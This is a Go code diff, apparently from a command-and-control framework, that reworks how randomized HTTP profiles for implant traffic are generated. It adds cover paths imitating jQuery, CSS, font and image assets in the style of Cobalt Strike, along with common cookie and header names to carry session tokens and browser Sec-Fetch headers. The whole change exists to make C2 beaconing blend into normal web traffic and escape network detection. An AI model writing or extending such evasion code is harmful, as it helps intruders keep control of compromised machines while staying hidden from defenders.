@@ -19,24 +19,49 @@ import (
 // generated value in the config file (and embed it in the agent) instead of
 // regenerating it on every load.
 
-// mallPathPrefixes and mallPathResources are combined into a plausible-looking
-// API route. They are deliberately generic service names that appear on real
-// telemetry/health endpoints.
+// mallStaticAssets are CS-style cover URIs that look like ordinary CDN,
+// JavaScript, stylesheet and font traffic. Some contain a %s cache-busting
+// token, mirroring hashed asset filenames.
 var (
-	mallPathPrefixes = []string{
-		"/api/v1", "/api/v2", "/api/v3", "/v1", "/v2", "/api", "/rest", "/services",
+	mallStaticAssets = []struct{ path, dest string }{
+		{"/jquery-3.3.1.min.js", "script"},
+		{"/jquery-3.6.4.min.js", "script"},
+		{"/static/js/main.%s.js", "script"},
+		{"/static/js/runtime-main.%s.js", "script"},
+		{"/assets/js/app.%s.js", "script"},
+		{"/assets/css/main.%s.css", "style"},
+		{"/static/media/logo.%s.svg", "image"},
+		{"/assets/fonts/inter-%s.woff2", "font"},
+		{"/assets/images/hero-%s.webp", "image"},
 	}
-	mallPathResources = []string{
-		"telemetry", "metrics", "events", "analytics", "status", "health",
-		"sync", "config", "updates", "reports", "sessions", "activity",
-		"ingest", "collect", "gateway", "beacon", "heartbeat", "inventory",
-		"devices", "agents", "endpoints", "checks", "signals", "presence",
+	mallAPIPrefixes = []string{
+		"/api/v2", "/api/v3", "/v2", "/services/api", "/rest/v2",
 	}
-	// mallHeaderWords are used to build a plausible request-header carrier for
-	// the session/init/close tokens.
-	mallHeaderWords = []string{
-		"Request", "Trace", "Session", "Stream", "Client", "Correlation",
-		"Conversation", "Transaction", "Activity", "Context", "Channel",
+	mallAPIResources = []string{
+		"orders", "catalog", "notifications", "profile", "settings", "search",
+		"inventory", "subscriptions", "account", "content", "recommendations",
+		"payments", "bookmarks", "preferences",
+	}
+	// Cobalt Strike's default jQuery profile carries the session in a
+	// session_id cookie. Header carriers are retained as a less common variant,
+	// but use ordinary tracing/correlation names rather than random X-* values.
+	mallSessionHeaders = []string{
+		"X-Session-ID", "X-Correlation-ID", "X-Request-ID", "X-Trace-ID", "X-Client-ID",
+	}
+	mallInitHeaders = []string{
+		"X-CSRF-Token", "X-Client-Version", "X-Request-Start", "X-Init-Token", "X-Requested-With",
+	}
+	mallCloseHeaders = []string{
+		"X-Client-Done", "X-Close-Token", "X-Request-End", "X-Session-End", "X-Connection-Close",
+	}
+	mallSessionCookies = []string{
+		"session_id", "JSESSIONID", "PHPSESSID", "connect.sid", "csrftoken", "sid", "AWSALB",
+	}
+	mallInitCookies = []string{
+		"_ga", "_gid", "csrf_token", "XSRF-TOKEN", "locale", "tz", "consent", "__cf_bm",
+	}
+	mallCloseCookies = []string{
+		"_gat", "prefs", "theme", "currency", "region", "remember_me", "device_id", "last_seen",
 	}
 	// mallUserAgents are current-ish browser strings. A browser User-Agent with
 	// no matching browser headers is itself a tell, so randomMalleableHeaders
@@ -60,70 +85,95 @@ func pick[T any](items []T) T {
 	return items[util.RandInt(0, len(items))]
 }
 
-// randomMalleablePath builds a plausible API route with an occasional random
-// segment so two builds rarely share the exact path.
-func randomMalleablePath() string {
-	path := fmt.Sprintf("%s/%s", pick(mallPathPrefixes), pick(mallPathResources))
+// randomMalleableCover picks either a static-asset URI or a quieter API route
+// and returns the matching browser header set. The static-asset case mirrors
+// the widely used Cobalt Strike jQuery default.
+func randomMalleableCover() (string, map[string]string) {
+	if util.RandInt(0, 100) < 70 {
+		asset := pick(mallStaticAssets)
+		path := asset.path
+		if strings.Contains(path, "%s") {
+			path = fmt.Sprintf(path, strings.ToLower(util.RandStr(util.RandInt(8, 13))))
+		}
+		headers := map[string]string{
+			"User-Agent":      pick(mallUserAgents),
+			"Accept":          "*/*",
+			"Accept-Language": pick(mallAcceptLanguages),
+			"Sec-Fetch-Dest":  asset.dest,
+			"Sec-Fetch-Mode":  "no-cors",
+			"Sec-Fetch-Site":  "same-origin",
+		}
+		return path, headers
+	}
+
+	path := fmt.Sprintf("%s/%s", pick(mallAPIPrefixes), pick(mallAPIResources))
 	switch util.RandInt(0, 3) {
 	case 0:
-		path += "/" + strings.ToLower(util.RandStr(util.RandInt(4, 8)))
-	case 1:
 		path += fmt.Sprintf("/%d", util.RandInt(1, 1_000_000))
+	case 1:
+		path += "/" + strings.ToLower(util.RandStr(util.RandInt(4, 8)))
 	}
-	return path
-}
-
-// randomHeaderName returns a unique request-header carrier name. The random
-// suffix keeps the session/init/close carriers from colliding (a shared header
-// name would overwrite the other value and break the session lookup).
-func randomHeaderName() string {
-	return fmt.Sprintf("X-%s-%s", pick(mallHeaderWords), strings.ToUpper(util.RandStr(util.RandInt(4, 6))))
-}
-
-func randomHeaderValue() string {
-	return util.RandStr(util.RandInt(10, 20))
-}
-
-// randomMalleableHeaders pairs a browser User-Agent with the headers that
-// browser would send on an XHR, so the User-Agent is not the only browser-like
-// thing in the request.
-func randomMalleableHeaders() map[string]string {
-	return map[string]string{
+	return path, map[string]string{
 		"User-Agent":      pick(mallUserAgents),
-		"Accept":          "*/*",
+		"Accept":          "application/json, text/plain, */*",
 		"Accept-Language": pick(mallAcceptLanguages),
-		"Accept-Encoding": "gzip, deflate, br",
 		"Sec-Fetch-Dest":  "empty",
 		"Sec-Fetch-Mode":  "cors",
 		"Sec-Fetch-Site":  "same-origin",
 	}
 }
 
+func randomHeaderValue() string {
+	return util.RandStr(util.RandInt(10, 20))
+}
+
+func randomHeaderFrom(pool []string, taken ...string) string {
+	for range 16 {
+		name := pick(pool)
+		if !slices.ContainsFunc(taken, func(item string) bool {
+			return strings.EqualFold(item, name)
+		}) {
+			return name
+		}
+	}
+	return pool[0] + "-" + strings.ToUpper(util.RandStr(4))
+}
+
+func randomCookieFrom(pool []string, taken ...string) string {
+	for range 16 {
+		name := pick(pool)
+		if !slices.Contains(taken, name) {
+			return name
+		}
+	}
+	return pool[0] + "_" + strings.ToLower(util.RandStr(4))
+}
+
 // RandomMalleableHTTPConfig returns a complete, internally consistent HTTP
-// profile with a randomized path, session carrier and browser headers.
+// profile with a randomized static-asset/API cover, session carrier and
+// browser headers.
 func RandomMalleableHTTPConfig() def.MalleableHTTPConfig {
+	path, headers := randomMalleableCover()
 	profile := def.MalleableHTTPConfig{
-		C2Path:        randomMalleablePath(),
-		CustomHeaders: randomMalleableHeaders(),
+		C2Path:        path,
+		CustomHeaders: headers,
 	}
 
-	// Most of the time carry the session in cookies (the common case for a
-	// telemetry-style endpoint). Occasionally use request headers instead.
-	if util.RandInt(0, 4) == 0 {
-		profile.SessionHeader = randomHeaderName()
+	// CS-style profiles normally carry the session in cookies. Header carriers
+	// remain as a lower-probability variant for deployments that prefer them.
+	if util.RandInt(0, 100) < 15 {
+		profile.SessionHeader = randomHeaderFrom(mallSessionHeaders)
 		profile.SessionValue = "%s"
-		// Distinct names are required: the client sets the session, init and
-		// close values independently, and a shared header would be overwritten.
-		profile.InitHeader = randomHeaderNameExcept(profile.SessionHeader)
+		profile.InitHeader = randomHeaderFrom(mallInitHeaders, profile.SessionHeader)
 		profile.InitValue = randomHeaderValue()
-		profile.CloseHeader = randomHeaderNameExcept(profile.SessionHeader, profile.InitHeader)
+		profile.CloseHeader = randomHeaderFrom(mallCloseHeaders, profile.SessionHeader, profile.InitHeader)
 		profile.CloseValue = randomHeaderValue()
 		return profile
 	}
 
-	sessionCookie := randomCookieName()
-	initCookie := randomCookieNameExcept(sessionCookie)
-	closeCookie := randomCookieNameExcept(sessionCookie, initCookie)
+	sessionCookie := randomCookieFrom(mallSessionCookies)
+	initCookie := randomCookieFrom(mallInitCookies, sessionCookie)
+	closeCookie := randomCookieFrom(mallCloseCookies, sessionCookie, initCookie)
 	profile.SessionHeader = "Cookie"
 	profile.SessionValue = sessionCookie + "=%s"
 	profile.InitHeader = "Cookie"
@@ -131,40 +181,6 @@ func RandomMalleableHTTPConfig() def.MalleableHTTPConfig {
 	profile.CloseHeader = "Cookie"
 	profile.CloseValue = closeCookie + "=" + randomHeaderValue()
 	return profile
-}
-
-// randomHeaderNameExcept returns a header name that is not one of the taken
-// names. The space is large enough that a retry loop terminates immediately in
-// practice, and the bound avoids any chance of spinning forever.
-func randomHeaderNameExcept(taken ...string) string {
-	for range 16 {
-		name := randomHeaderName()
-		if !slices.ContainsFunc(taken, func(item string) bool {
-			return strings.EqualFold(item, name)
-		}) {
-			return name
-		}
-	}
-	// Fall back to a suffix-collision-proof name rather than risk a shared
-	// carrier. This is deterministic but still unique among the three tokens.
-	return "X-Session-" + strings.ToUpper(util.RandStr(8))
-}
-
-func randomCookieName() string {
-	return strings.ToLower(util.RandStr(util.RandInt(6, 10)))
-}
-
-// randomCookieNameExcept returns a cookie name not present in taken. A shared
-// name would make http.Request.Cookie return the wrong value, so the session,
-// init and close cookies must all be distinct.
-func randomCookieNameExcept(taken ...string) string {
-	for range 16 {
-		name := randomCookieName()
-		if !slices.Contains(taken, name) {
-			return name
-		}
-	}
-	return randomCookieName() + util.RandStr(4)
 }
 
 // isCompleteMalleableConfig reports whether a profile specifies every field the
